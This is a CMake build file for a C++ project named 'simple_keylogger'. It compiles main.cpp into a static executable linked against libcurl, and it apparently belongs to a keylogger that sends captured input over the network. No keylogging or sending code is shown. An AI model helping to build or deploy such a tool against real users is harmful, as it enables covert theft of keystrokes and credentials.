cmake_minimum_required(VERSION 3.28)
project(simple_keylogger)

set(CMAKE_FIND_LIBRARY_SUFFIXES ".a")
set(BUILD_SHARED_LIBS OFF)
set(CMAKE_EXE_LINKER_FLAGS "-static")
set(CMAKE_CXX_STANDARD 20)

add_executable(simple_keylogger main.cpp)

find_package(CURL REQUIRED)
target_link_libraries(simple_keylogger PRIVATE CURL::libcurl)